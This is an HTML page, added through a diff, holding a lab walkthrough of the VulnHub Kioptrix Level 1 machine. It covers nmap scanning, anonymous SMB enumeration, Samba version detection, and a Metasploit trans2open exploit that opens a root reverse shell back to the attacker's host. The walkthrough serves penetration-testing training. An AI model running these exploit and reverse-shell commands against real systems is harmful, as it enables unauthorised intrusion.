@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kioptrix Level 1 Walkthrough</title>
+    
+    <style>
+        /* --- General Body & Typography --- */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #121212;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* --- Main Content Area --- */
+        main {
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 0 10px;
+        }
+
+        /* --- Article Styling (for each write-up) --- */
+        article {
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            padding: 25px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        article h1 {
+            font-size: 2.5em;
+            text-align: center;
+            color: #4CAF50;
+            border-bottom: 2px solid #333;
+            padding-bottom: 5px;
+        }
+
+        article h2 {
+            font-size: 1.8em;
+            color: #5cb85c; /* Lighter Green */
+            margin-top: 30px;
+        }
+
+        p {
+            font-size: 1.1em;
+            margin-bottom: 15px;
+        }
+
+        ul, ol {
+            padding-left: 25px;
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+
+        /* --- Code Blocks & Inline Code --- */
+        pre {
+            background-color: #111;
+            color: #f4f4f4;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto; /* Handles long lines */
+            border: 1px solid #222;
+        }
+
+        code {
+            font-family: "Consolas", "Menlo", "Courier New", monospace;
+            font-size: 0.95em;
+        }
+
+        /* For inline code snippets */
+        p > code, li > code {
+            background-color: #333;
+            color: #e0e0e0;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+
+        strong {
+            color: #4CAF50;
+        }
+        
+        /* --- Author Signature --- */
+        .author {
+            text-align: right;
+            font-style: italic;
+            font-size: 1.1em;
+            margin-top: 30px;
+            color: #aaa;
+        }
+
+    </style>
+</head>
+<body>
+
+    <main>
+
+        <article id="kioptrix">
+            <h1>Kioptrix Level 1 Lab Guide: SMB Enumeration to Root Shell</h1>
+
+            <h2>Introduction</h2>
+            <p>The Kioptrix Level 1 machine is a classic beginner-friendly VulnHub lab designed to teach fundamental enumeration and exploitation. The objective is to gain root access on a simulated misconfigured Linux system.</p>
+    
+            <h2>Step 1: Reconnaissance with Nmap</h2>
+            <p>The initial Nmap scan revealed several old and vulnerable services.</p>
+            <pre><code># nmap 192.168.100.45 -T4 -sV -A
+PORT    STATE SERVICE       VERSION
+22/tcp  open  ssh           <strong>OpenSSH 2.9p2</strong> (protocol 1.99)
+80/tcp  open  http          <strong>Apache httpd 1.3.20</strong>
+139/tcp open  netbios-ssn   <strong>Samba smbd</strong>
+445/tcp open  ssl/https     Apache/1.3.20 (Unix) (Red-Hat/Linux)</code></pre>
+            <p>The key findings are a very old OpenSSH, an ancient Apache, and Samba running on port 139. Samba is a frequent source of remote code execution.</p>
+
+            <h2>Step 2: Enumerating SMB Shares</h2>
+            <p>I used <code>smbclient</code> to list the shares on the target and found that anonymous login was enabled.</p>
+            <pre><code># smbclient -L //192.168.100.45/
+<strong>Anonymous login successful</strong>
+
+Sharename       Type      Comment
+---------       ----      -------
+IPC$            IPC       IPC Service (Samba Server)
+ADMIN$          IPC       IPC Service (Samba Server)
+...</code></pre>
+            <p>This confirmed anonymous access and suggested the Samba version was old.</p>
+    
+            <h2>Step 3: Metasploit - SMB Version Detection</h2>
+            <p>To pinpoint the exact Samba version, I used a Metasploit auxiliary scanner.</p>
+            <pre><code>msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.100.45
+msf6 auxiliary(scanner/smb/smb_version) > set RPORT 139
+msf6 auxiliary(scanner/smb/smb_version) > run
+...
+[+] 192.168.100.45:139    Host could not be identified: Unix (<strong>Samba 2.2.1a</strong>)</code></pre>
+            <p>The target is running <strong>Samba 2.2.1a</strong>, which is vulnerable to a buffer overflow attack.</p>
+    
+            <h2>Step 4: Exploiting Samba with Metasploit</h2>
+            <p>I searched Metasploit for an exploit and found <code>exploit/linux/samba/trans2open</code>, which targets this exact vulnerability.</p>
+            <pre><code>msf6 > use exploit/linux/samba/trans2open
+msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.100.45
+msf6 exploit(linux/samba/trans2open) > set LHOST 192.168.100.18
+msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+msf6 exploit(linux/samba/trans2open) > run
+
+[*] Started reverse TCP handler on 192.168.100.18:4444
+...
+[*] Trying return address 0xbffffdfc...
+...
+[+] Command shell session 5 opened (192.168.100.18:4449 -> 192.168.100.45:1029)
+
+whoami
+<strong>root</strong></code></pre>
+    
+            <h2>Conclusion</h2>
+            <p>The exploit was successful and provided a reverse shell, landing as the <code>root</code> user. Kioptrix Level 1 was successfully compromised.</p>
+    
+            <p class="author">~ Rahul Lingampally</p>
+        </article>
+
+    </main>
+
+</body>
+</html>
